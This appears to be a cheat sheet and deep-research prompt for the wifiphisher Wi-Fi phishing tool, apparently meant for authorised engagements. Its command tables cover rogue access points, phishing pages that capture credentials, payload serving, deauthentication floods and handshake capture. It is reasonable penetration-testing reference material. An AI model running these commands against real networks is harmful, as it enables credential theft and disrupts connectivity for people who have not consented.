# wifiphisher — command scenarios for deep research

Flags below come from the installed 1.4 build (`help.txt`). The Python 3
compatibility patch in this install is local; verify it after upgrades.

## How to invoke

```text
@deep-research Which wifiphisher phishing scenarios and extensions still work
on Python 3.13 with roguehostapd, and what interface/driver combinations are
required for reliable AP+monitor operation? Cite the repo, open issues, and
release notes; return a scenario shortlist and exact flags.
```

---

## Scenario 1 — choose interfaces safely

| # | Command | How to use |
|---|---------|------------|
| 1 | `sudo wifiphisher -i wlan0` | Single adapter supporting AP + monitor |
| 2 | `sudo wifiphisher -aI wlan0 -eI wlan1` | Split AP and deauth roles |
| 3 | `sudo wifiphisher -iI eth0 -aI wlan0 -eI wlan1` | Explicit internet-facing interface |
| 4 | `sudo wifiphisher -pI wlan0 wlan1` | Keep NetworkManager away from chosen interfaces |
| 5 | `sudo wifiphisher -mI wlan0` | MITM through an internet-connected interface |

**Research questions**
- Which adapters support simultaneous AP and monitor mode on this kernel?
- Does `-pI` actually prevent NetworkManager from resetting the interface?

**Sources:** upstream docs, driver/chipset compatibility lists, `iw list`.
**Output:** an interface plan and an adapter that stays in the chosen mode.

---

## Scenario 2 — stand up a rogue AP

| # | Command | How to use |
|---|---------|------------|
| 6 | `sudo wifiphisher -e "Free WiFi"` | Skip AP selection and use a fixed ESSID |
| 7 | `sudo wifiphisher -pK s3cr3t` | Add WPA/WPA2 to the rogue AP |
| 8 | `sudo wifiphisher -dK` | Disable KARMA |
| 9 | `sudo wifiphisher -kB` | Broadcast known-beacon SSIDs |
| 10 | `sudo wifiphisher -cM` | Follow the target AP across channels |
| 11 | `sudo wifiphisher -fH` | Force system hostapd |

**Research questions**
- Does KARMA improve client capture on modern devices that probe explicitly?
- When does `-fH` outperform the bundled roguehostapd?

**Sources:** upstream README, issue tracker, hostapd logs.
**Output:** an association log and a client that reaches the portal.

---

## Scenario 3 — phishing scenario and credential capture

| # | Command | How to use |
|---|---------|------------|
| 12 | `sudo wifiphisher -p firmware_upgrade` | Run a named scenario |
| 13 | `sudo wifiphisher -p oauth_login -qS` | Stop after one credential pair |
| 14 | `sudo wifiphisher -pE "Hotel WiFi"` | Override the ESSID shown on the page |
| 15 | `sudo wifiphisher -pPD /opt/pages` | Use custom phishing pages |
| 16 | `sudo wifiphisher -cP /evidence/creds.log` | Write credentials to a known file |
| 17 | `sudo wifiphisher --payload-path /srv/payload` | Serve a payload from a scenario |

**Research questions**
- Which scenarios are self-contained and which need external pages?
- What consent and data-retention rules apply to captured credentials?

**Sources:** scenario directory, engagement rules of engagement.
**Output:** a timestamped credential log with a documented chain of custody.

---

## Scenario 4 — deauth, WPS, and handshake verification

| # | Command | How to use |
|---|---------|------------|
| 18 | `sudo wifiphisher -dC 1,6,11` | Deauth on selected channels |
| 19 | `sudo wifiphisher -dE "CorpNet"` | Deauth every BSSID with that ESSID |
| 20 | `sudo wifiphisher -nD` | Skip deauthentication entirely |
| 21 | `sudo wifiphisher -wP -wAI wlan0` | Monitor WPS-PBC registrar presses |
| 22 | `sudo wifiphisher -hC capture.pcap` | Verify a captured handshake |
| 23 | `sudo wifiphisher -lC` | Capture BSSIDs for Lure10 |

**Research questions**
- Is deauth necessary for the target client, or does it create a detectable anomaly?
- Does `cowpatty` exist for `-hC`, and which handshake formats does it accept?

**Sources:** `cowpatty` docs, 802.11 frame captures, program rules.
**Output:** a handshake verdict or a WPS event log.

---

## Scenario 5 — logging and cleanup

| # | Command | How to use |
|---|---------|------------|
| 24 | `sudo wifiphisher --logging -lP /evidence/wifiphisher.log` | Persist activity |
| 25 | `sudo wifiphisher -iNM` | Do not randomise MAC addresses |
| 26 | `sudo wifiphisher -kN` | Keep NetworkManager running |
| 27 | `sudo wifiphisher -nE` | Disable extensions for a minimal run |

**Research questions**
- Which artefacts does wifiphisher leave in `/tmp`, dnsmasq leases, and logs?
- What is the clean teardown sequence after an engagement?

**Sources:** source tree, host logs, engagement checklist.
**Output:** a complete log bundle and a restored network state.

## Flag coverage checklist

| Help group | Flags | Scenario |
|------------|-------|----------|
| Interfaces | `-i -aI -eI -iI -pI -mI -iAM -iEM -iNM -kN` | 1, 5 |
| AP behaviour | `-e -pK -dK -kB -cM -fH --dnsmasq-conf` | 2 |
| Phishing | `-p -pE -pPD --payload-path -cP -qS` | 3 |
| Deauth/WPS/handshake | `-dC -dE -nD -wP -wAI -hC -lC -lE` | 4 |
| Logging | `--logging -lP` | 5 |

## Scenario index

| Scenario | Commands |
|----------|----------|
| 1 — choose interfaces | 5 |
| 2 — rogue AP | 6 |
| 3 — phishing and capture | 6 |
| 4 — deauth/WPS/handshake | 6 |
| 5 — logging and cleanup | 4 |
